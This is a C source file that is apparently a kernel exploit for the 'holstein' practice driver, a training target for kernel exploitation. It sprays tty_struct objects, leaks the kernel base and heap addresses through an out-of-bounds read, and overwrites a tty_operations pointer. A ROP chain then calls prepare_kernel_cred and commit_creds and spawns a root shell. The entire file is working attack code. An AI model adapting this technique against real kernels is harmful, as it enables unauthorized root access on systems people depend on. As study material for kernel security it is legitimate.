#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <sys/ioctl.h>

int device_fd;
void open_device(){
    device_fd = open("/dev/holstein", O_RDWR);
    if (device_fd < 0){
        puts("Failed to open /dev/holstein");
        exit(-1);
    } else {
        puts("Device /dev/holstein openned");
    }
}

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

void save_registers_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void pwn(){
    puts("[*] Spawning shell on user land");
    uid_t uid = getuid();

    if (uid == 0){
        printf("[+] UID: %d, got root!");
    } else {
        printf("[-] UID: %d, could ot get root.");
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long tty_ops_offset = 0xc38880UL;

// 0xffffffff811077fc : push rdx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
unsigned long push_rdx__add_rbx_pl__pop_rsp__pop_r13__pop_rbp__ret = 0x1077fc;

// 0xffffffff810d748d : pop rdi ; ret
unsigned long pop_rdi__ret = 0xd748d;
// 0xffffffff8113c1c4 : pop rcx ; ret
unsigned long pop_rcx__ret = 0x13c1c4;
// 0xffffffff8162707b
unsigned long mov_rdi_rax__rep__ret = 0x62707b;

// ffffffff810744b0 T commit_creds
unsigned long commit_creds = 0x744b0;
// ffffffff81074650 T prepare_kernel_cred
unsigned long prepare_kernel_cred = 0x74650;
// ffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode
unsigned long swapgs_restore_regs_and_return_to_usermode = 0x800e10;

int main(){

    // (module_write) 0x100355 copy_from_user = *module_write+0x108

    save_registers_state();

    int spray[100];
    int cont = 0;

    // Fazendo spray de objetos tty_struct antes e depois da alocaÃ§ao do buffer do driver
    printf("Spraing tty_struct objects\n");
    for (; cont < 50; cont ++){
        spray[cont] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[cont] == -1){
            puts("Error openning ptmx (Spray 1)");
            exit(-1);
        }
    }

    open_device();

    printf("Spraing tty_struct objects\n");
    for (; cont < 100; cont ++){
        spray[cont] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[cont] == -1){
            puts("Error openning ptmx (Spray 2)");
            exit(-1);
        }
    }


    printf("Writing to device buffer\n");

    unsigned long leak[160];
    read(device_fd, &leak, 0x500);

    // g_buf + 0x400 + 0x18 = base_address + tty_ops_offset
    unsigned long _text_addr = (unsigned long) leak[131] - tty_ops_offset;
    printf("Base address: 0x%lx\n", _text_addr);

    // heap address of g_buf
    unsigned long heap_g_buf = (unsigned long) leak[135] - 0x438;
    printf("Heap address: 0x%lx\n", heap_g_buf);

    char buf[0x500];
    memset(&buf, 0, 0x500);
    memcpy(&buf, &leak, 0x500);

    unsigned long *buf_p = (unsigned long*)&buf;

    // Crafting a fake function table to work as tty_operations struct
    // Since we don't know what function will be called, let's create addresses to try to identify it
    // cont = 0;
    // for (; cont < 0x40; cont++){
    //     *buf_p++ = 0xffffffffdead0000 + cont;
    // }
    printf("ROP Start: 0x%lx\n", push_rdx__add_rbx_pl__pop_rsp__pop_r13__pop_rbp__ret + _text_addr);
    buf_p[0xc] = push_rdx__add_rbx_pl__pop_rsp__pop_r13__pop_rbp__ret + _text_addr;

    int off = 0xd;
    // Start of rop chain
    buf_p[off++] = pop_rdi__ret + _text_addr;
    buf_p[off++] = 0x0UL;
    buf_p[off++] = prepare_kernel_cred + _text_addr;
    
    buf_p[off++] = pop_rcx__ret + _text_addr;
    buf_p[off++] = 0x0;
    buf_p[off++] = mov_rdi_rax__rep__ret + _text_addr;

    buf_p[off++] = commit_creds + _text_addr;
    buf_p[off++] = swapgs_restore_regs_and_return_to_usermode + 22UL + _text_addr;
    buf_p[off++] = 0x0;
    buf_p[off++] = 0x0;

    buf_p[off++] = (unsigned long)pwn;
    buf_p[off++] = user_cs;
    buf_p[off++] = user_rflags;
    buf_p[off++] = user_sp;
    buf_p[off++] = user_ss;

    printf("swapgs = 0x%lx\n", swapgs_restore_regs_and_return_to_usermode + _text_addr);

    // Putting heap_g_buf into position 0x418 of heap / overwritting tty_operations address on tty_struct
    *(unsigned long*)&buf[0x418] = heap_g_buf;

    puts("Writting payload to heap");
    // Write until end of heap_g_buf address
    write(device_fd, buf, 0x420);

    puts("Executing ioctl");
    cont = 0;
    for (; cont < 100; cont++){
        ioctl(spray[cont], 0x42424242, (unsigned long)heap_g_buf+0x68-0x10);
    }

    printf("Done\n");
    close(device_fd);
}